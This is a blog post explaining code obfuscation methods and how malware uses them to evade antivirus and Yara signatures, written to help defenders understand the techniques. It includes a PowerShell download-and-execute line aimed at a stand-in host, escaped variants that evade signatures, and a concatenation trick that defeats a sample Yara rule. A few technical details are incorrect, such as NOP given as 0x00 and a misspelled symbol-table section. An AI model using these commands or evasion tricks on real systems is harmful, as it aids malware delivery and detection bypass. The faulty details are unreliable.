---
layout: post
title: "Code Obfuscation"
author: "Mouse"
categories: cybersecurity
tags: [cybersecurity, programming, malware, reverse-engineering]
image: code.jpeg
permalink: /cybersecurity/code-obfuscation
---

### Obfuscation Overview

__Obfuscation__<br>
_noun_ - the action of making something obscure, unclear, or unintelligible.

Code obfuscation has two main use cases:
* Hiding code to prevent reverse engineering of intellectual property or trade secrets
     >The game Minecraft uses code obfuscation to hide its source code. Minecraft uses the [ProGuard Tool](https://github.com/Guardsquare/proguard), which is an obfuscator for classes in Java bytecode.

* Preventing anti malware and security analysts from detecting and protecting against malware
    > One notable example of this was the 2020 SolarWinds attacks. Threat actors injected some discrete, obfuscated code into DLL files. Microsoft produced an [excellent report](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/) detailing this attack.

Code obfuscation can be as simple as encrypting code, replacing variable and class names with meaningless labels, or adding random chunks of code that do absolutely nothing. As a small example, consider the following JavaScript.

{% highlight js %}
var greeting = 'Hello World';
greeting = 10;
var product = greeting * greeting;
{% endhighlight %}

This is a simple script, and easy for humans to read and follow the logic. It can be obfuscated as follows:

{% highlight js %}
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ',
'15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+
parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
{% endhighlight %}

This behemoth of a script does exactly the same thing, and is near impossible for a human to understand. If you want to see some more interesting examples, [this StackExchange thread](https://codegolf.stackexchange.com/questions/22533/weirdest-obfuscated-hello-world) has many examples of obfuscating the string ```hello world```.


Some of the biggest hurdles malware developers face are antivirus engines and EDR (endpoint detection and response) systems. These detect malware based on a database of stored signatures. Antivirus and EDR systems deserve an entire article of their own, but two methods they use to detect malware are static signatures and heuristic signatures.
* __Static signatures__ compare suspected malware code to a database of known malware samples, and flags up any matches.
* __Heuristic signatures__ can detect malware code by searching for suspicious features

Obfuscation helps to evade signature-based detection by ensuring any developed malware does not match any known signatures.

Some common methods of code obfuscation include:
* __Renaming__ - changing the names of variables and classes to meaningless identifiers, sometimes including unprintable or invisible characters
* __Packing__ - compressing the entire program so that it is unreadable
* __Control flow__ - changing the flow of logic in the program to create ‘spaghetti logic’, which is difficult to follow
* __Instruction pattern transformation__ - replacing commonly used simple instructions with uncommon, more complicated instructions that do the same thing
* __Dummy code__ - inserting code that does absolutely nothing but confuses the reader
* __Metadata removal__ - stripping the code of any metadata and comments designed to make the program easy to read
* __Opaque predicates__ - inserting conditional statements (if-then-else statements) that always evaluate in the same way, that seem meaningless to an analyst
* __Anti-tamper and anti-debug__ - tools that prevent anyone from running debug tools or modifying the code by stopping the program
* __Encryption__ - strings can be encrypted, and only decrypted when they are needed during runtime
* __Code transposition__ - reordering sections of code so that the ordering makes no sense, but the code is still functional

There are many other methods of code obfuscation out there, the above are a few of the most common.

### A Layered Approach

[This paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) provides a detailed methodology for software obfuscation. It includes a taxonomy of obfuscation layers, much like the OSI model. The linked paper is a fascinating read, and details many more methods of obfuscation.

![alt text](\assets\img\cybersecurity\code_obfuscation\layers.PNG)

* Code-Element Layer
    * This layer aims to obfuscate code itself, as discussed above.
* Software-Component Layer
    * This layer aims to obfuscate entire software packages or executables, like Java libraries or ELF files (executable file format - executable files often used on Linux systems)
* Inter-Component Layer
    * This layer aims to obfuscate interfaces between different software packages, for example library calls and resource encryption
* Application Layer
    * This layer is more specific to the application at hand, for example obfuscating neural networks, or DRM (digital rights management) systems. DRM systems are often used to prevent pirates from gaining cracked versions of movies and video games.

For the rest of this article, I will be focusing on the code-element layer. Perhaps the other layers will appear in a future post.

The code-element layer can be further split into four sublayers, each with their own obfuscation methods.

![alt text](\assets\img\cybersecurity\code_obfuscation\code_layers.PNG)

### Obfuscating Data

One of the most useful groups of obfuscation methods is the ‘obfuscating data’ layer. This group of methods aims to hide important identifiable data, and focus on hiding common data types such as integers, strings and arrays.

The paper has given four main methods for obfuscating data:

__Array transformation__ - methods include splitting one array into multiple arrays, merging multiple arrays together, flattening arrays to reduce their dimension, and folding arrays to increase their dimension

__Data encoding__ - uses mathematical encoding algorithms or ciphers to make the data unreadable

__Data proceduralization__ - replaces static data with function calls, for example replacing all strings with a function that can generate all strings based on its parameters. Another method is replacing numbers with the values of invertible function.
>For example, if we have the strings ```apple```, ```bandana``` and ```ducks``` in our code, define a function ```f``` with return values ```f(0) = ‘apple’```, ```f(1) = ‘bandana’``` and ```f(2) = ‘ducks’```. In the program, only refer to the function ```f``` instead of the strings themselves.

__Data splitting/merging__ - much like splitting and merging arrays, this method transforms other data types. For example, a boolean variable can be distributed into multiple booleans with the same logical output

#### String Concatenation

One simple programming concept that can be exploited is string concatenation. Most programming languages allow you to concatenate, or join, two or more strings together. For example, the below code snippet shows string concatenation in Python, which uses the ```+``` operator to denote concatenation.

{% highlight python %}
s1 = 'rubber'
s2 = 'ducky'
print(s1+s2)
>> 'rubberducky'
{% endhighlight %}

Wikipedia has a [list of string concatenation operators](https://en.wikipedia.org/wiki/Comparison_of_programming_languages_(strings)) for various programming languages. Python, C#, C++, Java and PowerShell all support the ```+``` operator. PowerShell also supports ```,``` and ```$```, C# also supports ```String.Join``` and ```String.Concat```, and C supports the operator ```strcat```.

Static signatures can be evaded by exploiting concatenation. An attacker can break up strings included in code to evade any signatures looking for them, and concatenate the string back together during runtime.

For example, consider the following Yara rule. Yara is an intrusion and detection system, or IDS, that includes the use of signatures to trigger alerts for suspicious activity.

{% highlight xml %}
rule rubberduckyrule {
   strings:
      $text_string = ‘powershell.exe’
	  $hex_string = { 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 }

   condition:
      $text_string or $hex_string
}
{% endhighlight %}

This Yara rule will look for any instances of ```powershell.exe``` (or the hex equivalent) in malware code, and raise an alert on any positive instances. Using string concatenation, we can evade this Yara rule!

Suppose we have the following line of C# code in our malware:

{% highlight c# %}
System.Diagnostics.Process.Start("powershell.exe")
{% endhighlight %}

The ```powershell.exe``` string can be obfuscated into the following line:

{% highlight c# %}
System.Diagnostics.Process.Start("po"+"w"+"ers"+"he"+"l"+".e"+"xe")
{% endhighlight %}

The first line would trigger a Yara alert, but the second line would evade it completely! If we couple this with some of the previously mentioned methods for data obfuscation, such as data proceduralization, this code would be incredibly difficult to detect by static signature-based IDSs.

#### More String Obfuscation

We can take the string concatenation method further by introducing non-interpreted characters. PowerShell scripts are particularly vulnerable to this method.

For example, we can introduce escaping characters, such as ``` ` ``` to strings. This will break the string up and evade any static signature-based detection systems. For example, consider the powershell command

{% highlight powershell %}
(New-Object System.Net.WebClient ).DownloadFile('http://evilduck.com/payload.exe') ; Start-Process("$env:APPDATA\payload.exe)
{% endhighlight %}

This Powershell script will connect to ```http://evilduck.com```, download the file ```payload.exe```, and execute it. If an IDS has a signature for ```evilduck.com``` or ```payload.exe```, it’s game over for the malware developer.

Using escape characters, the url in the script can be obfuscated to become

```
h`ttp://evi`ld`uc`k`.co`m/p`ayl`oa`d
```

Powershell will ignore the ``` ` ``` characters when executing, so the original executable payload will still be downloaded and executed. However, this is now much harder for a signature-based IDS to detect.

Another method in Powershell obfuscation is reordering, with the format operator ```-f```. For example, the string ```payload.exe``` can be obfuscated to

```
{1}{0} -f ‘oad.exe’, ‘payl’
```

Other methods include randomly adding upper and lowercase letters to strings, and inserting random whitespaces between words. A combination these, concatenation, escape characters, reordering and other non-interpreted characters, and other string-based obfuscation methods can make life for static signature-based IDSs pretty difficult.

As great as these methods are at evading IDSs, a skilled human would still be able to understand data obfuscated by code (probably after a lot of caffeine). For this reason, we turn to some more methods of code obfuscation.

Going back to the taxonomy outlined above, we now look at the other sublayers of the code-element layer.

### Code Layout Obfuscation

![alt text](\assets\img\cybersecurity\code_obfuscation\layout_layers.PNG)


The ‘obfuscating layout’ sublayer attempts to completely mess up the layout of a program. The following methods can be used:

 __Meaningless identifiers__ - completely disregard any logical naming conventions you use, and scramble them all up.
>In C and C++, the names of global variables and functions are still stored in compiled binaries, and Java bytecode still keeps names. This method is also known as lexical obfuscation.

__Stripping redundant symbols__ - many compiled programs contain metadata not used in runtime, but used to debug code. This can be removed to make reverse engineering a truly cumbersome process.
>For example, compiled ELF files have symbol tables stored in the ```.symbtab``` section, containing identifier-address pairs. The symbol table will include local and global variables, function names and entry points. This symbol table is only used to debug programs, so can be removed with the command ```strip --strip-uneeded [target.elf]```

__Separating related codes__ - this method aims to shuffle parts of a program which are logically related.
>For example, using numerous unconditional jumps in assembly code using the ```goto``` command (or equivalent)

__Junk Code__ - adds instructions and methods which have no functionality.
>For example, in binaries no-operation instructions (```NOP``` or ```0x00```) can be inserted. This will make code hard to read, and change the signature of the program.

Malware analysts use identifiers such as variables, functions and classes to attempt to understand a malicious program. This data should be obfuscated to avoid anyone understanding what’s going on.

Depending on whether a program is compiled or interpreted, object names can give insight into the functionality of a program. If the program is interpreted, for example Python or Powershell scripts, all object identifiers remain during runtime. If the program is compiled, for example C or C#, only objects appearing in strings are recoverable during runtime. The ```strings``` Linux command can be used to find all strings in a compiled program.


### Code Controls Obfuscation

![alt text](\assets\img\cybersecurity\code_obfuscation\control_layers.PNG)

This layer attempts to alter the flow of a program and change its control to increase program complexity. The following methods can be used:
* __Bogus control flows__ - this method adds control flows that will never be executed to a program, increasing the program complexity
* __Probabilistic control flows__ - repeats control flow sequences with certain probabilities
* __Dispatcher-based controls__ - changes the next block of code to be executed during runtime
* __Implicit controls__ - switches out explicit instructions for implicit instructions
>For example, in assembly code ```jmp``` and ```jne``` jump commands can be replaced with a combination of ```mov``` move commands, which implement the same semantics.

#### Bogus Control Flows
We will now examine bogus control flow methods in more detail.

Control flows determine how a program will logically execute. Examples of control flow constructs are if/else statements, try/catch statements, while/for loops, and switch/case statements.

We can create Control Flow Graphs (CFGs) to graphically show the possible paths of a program’s execution sequence. For example, consider the code block:

{% highlight python %}
x = 5
if (x > 10) {
   print("Greater than ten")
}

else {
   print("Less than or equal to 10")
}
{% endhighlight %}

The below CFG diagrammatically shows this control flow.

![alt text](\assets\img\cybersecurity\code_obfuscation\basic_cfg.png)

Attackers can manipulate control flows by adding obscure and arbitrary flows of logic. The method of bogus control flow aims to leverage maths, logic and complex algorithms to inject complicated structures into code, confusing any analysts.

For example, opaque predicates can be added. Predicates are true or false statements, often used to dictate the flow of a program. Opaque predicates are predicates whose value is known to the attacker, but are incredibly difficult to deduce. They will always return the same value - always true or always false.

[This paper](https://etda.libraries.psu.edu/files/final_submissions/17513) gives an incredibly detailed analysis of numerous methods of opaque predicate injection. I will go through some methods at a high level.

Opaque predicates can be generated with mathematical expressions. For example, the expression

$$4x^2 + 5 \!= y^3$$

always returns ```True``` for all integers $$x,y$$. This could be inserted as a conditional branch, as shown below.
{% highlight python %}
int a, b;
if (4x^2 + 5 != y^3) {
    originalCode()
}

else {
    fakeCode()
}
{% endhighlight %}

When this code snippet is executed, ```orginalCode()``` will always run, and ```fakeCode()``` will never run. Wtih a more complicated mathematical expression, an analyst with no mathematical background could become hopelessly confused.

In order to evade detection more effectively, the mathematical expression could be taken from a family of related expressions, and an obfuscator can choose a random expression each time.

Another method of control obfuscation through mathematical predicates is employing unsolved conjectures. For example, the Collatz Conjecture gives an algorithm that takes in a positive integer, and proceeds as follows:

```
If the number is even, divide it by 2
If the number is odd, triple it and add 1.
Repeat until convergence.
```

If you are able to prove that this always converges to 1, you will be heralded as a mathematical legend. Empirical evidence has suggested that no matter which integer you start with, this algorithm always converges to 1. This is known as the Collatz Conjecture.

This can be encapsulated in the following expression:

$$
f(n) =
\begin{cases}
n/2, & \text{if $n$ is even} \\
3n + 1, & \text{if $n$ is odd}
\end{cases}
$$


It is unknown why this always converges to 1, but if you run this loop long enough, it will always be true. If implemented into a conditional branch, no matter how ```n``` is initialised,  ```n``` will always eventually equal 1, so the original code can always run. This method will give quite a challenge for any dynamic analysis, as it is unknown how long this loop will run for. The Collatz Conjecture can be used for control flow obfuscation as follows:

{% highlight python %}
int x;
while (x > 1) {
    If (x % 2 == 1) {
        x = 3*x + 1;
    }

    else {
        x = x / 2;
    }

    if (x == 1) {
        originalCode()
    }

    else {
        fakeCode()
    }
}
{% endhighlight %}


Below is a table of number of steps it takes a starting value of x to converge. By computational standards, convergence is always fast.

Initial value of x  | Steps Until Convergence to 1  
:---------------: | :---------------:|
1     | 3        |
2     | 1        |
3     | 7        |
4     | 2        |
5     | 5        |
10    | 6        |
20    | 7        |
50    | 24       |
100   | 25       |
200   | 26       |
500   | 110      |
1000  | 111      |
2000  | 112      |
5000  | 28       |
10000 | 29       |

Below is the CFG for implementing the Collatz Conjecture method.

![alt text](\assets\img\cybersecurity\code_obfuscation\collatz_cfg.png)

This is already a more complicated control flow graph, and shows that this method introduces complexity to a program.

There are countless other ways of introducing opaque predicates to a program, and even more ways of implementing bogus control flows and other code control obfuscation methods. See the [paper linked above](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) for even more methods.


### Conclusion

In this article, we have described many methods of code obfuscation and further explored methods such as string concatenation and opaque predicates. These methods can be some of the most effective at evading IDS systems.

In order to protect against malware, we have to understand it. There is a constant cat-and-mouse chase between malicious actors devising new obfuscation methods, and malware analysts trying to dissect these methods and prevent malware from slipping through the cracks. Both attackers and defenders must have an understanding of the tools discussed and their impacts.
